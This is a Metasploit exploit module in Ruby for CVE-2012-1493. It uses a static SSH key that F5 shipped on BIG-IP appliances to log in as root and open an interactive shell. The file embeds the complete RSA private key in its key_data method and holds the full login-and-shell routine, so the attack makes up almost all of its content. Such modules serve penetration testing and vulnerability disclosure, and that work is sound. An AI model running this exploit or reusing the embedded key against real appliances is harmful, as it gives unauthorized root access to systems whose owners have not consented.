# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
require &#039;net/ssh&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Auxiliary::Report
 
 
    def initialize(info = {})
        super(update_info(info, {
            &#039;Name&#039;        => &#039;F5 BIG-IP SSH Private Key Exposure&#039;,
            &#039;Version&#039;     => &#039;$Revision$&#039;,
            &#039;Description&#039; => %q{
                F5 ships a public/private key pair on BIG-IP appliances that allows
                passwordless authentication to any other BIG-IP box. Since the key is
                easily retrievable, an attacker can use it to gain unauthorized remote
                access as root.
            },
            &#039;Platform&#039;    => &#039;unix&#039;,
            &#039;Arch&#039;        => ARCH_CMD,
            &#039;Privileged&#039;  => true,
            &#039;Targets&#039;     => [ [ "Universal", {} ] ],
            &#039;Payload&#039;     =>
                {
                    &#039;Compat&#039;  => {
                        &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
                        &#039;ConnectionType&#039; => &#039;find&#039;,
                    },
                },
            &#039;Author&#039;      => [&#039;egypt&#039;],
            &#039;License&#039;     => MSF_LICENSE,
            &#039;References&#039;  =>
                [
                    [ &#039;URL&#039;, &#039;https://www.trustmatta.com/advisories/MATTA-2012-002.txt&#039; ],
                    [ &#039;CVE&#039;, &#039;2012-1493&#039; ],
                    [ &#039;OSVDB&#039;, &#039;82780&#039; ]
                ],
            &#039;DisclosureDate&#039; => "Jun 11 2012",
            &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/interact&#039; },
            &#039;DefaultTarget&#039; => 0,
        }))
 
        register_options(
            [
                # Since we don&#039;t include Tcp, we have to register this manually
                Opt::RHOST(),
                Opt::RPORT(22),
            ], self.class
        )
 
        register_advanced_options(
            [
                OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
                OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
            ]
        )
 
    end
 
    # helper methods that normally come from Tcp
    def rhost
        datastore[&#039;RHOST&#039;]
    end
    def rport
        datastore[&#039;RPORT&#039;]
    end
 
    def do_login(user)
 
        opt_hash = {
            :auth_methods => [&#039;publickey&#039;],
            :msframework  => framework,
            :msfmodule    => self,
            :port         => rport,
            :key_data     => [ key_data ],
            :disable_agent => true,
            :config => false,
            :record_auth_info => true
        }
        opt_hash.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]
        begin
            ssh_socket = nil
            ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
                ssh_socket = Net::SSH.start(rhost, user, opt_hash)
            end
        rescue Rex::ConnectionError, Rex::AddressInUse
            return :connection_error
        rescue Net::SSH::Disconnect, ::EOFError
            return :connection_disconnect
        rescue ::Timeout::Error
            print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
            return :connection_disconnect
        rescue Net::SSH::AuthenticationFailed
            print_error "#{rhost}:#{rport} SSH - Failed authentication"
        rescue Net::SSH::Exception => e
            return [:fail,nil] # For whatever reason.
        end
 
        if ssh_socket
 
            # Create a new session from the socket, then dump it.
            conn = Net::SSH::CommandStream.new(ssh_socket, &#039;/bin/sh&#039;, true)
            ssh_socket = nil
 
            return conn
        else
            return false
        end
    end
 
    def exploit
        conn = do_login("root")
        if conn
            print_good "Successful login"
            handler(conn.lsock)
        else
            print_error "Login failed"
        end
    end
 
 
    def key_data
        <<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----
EOF
        end
end



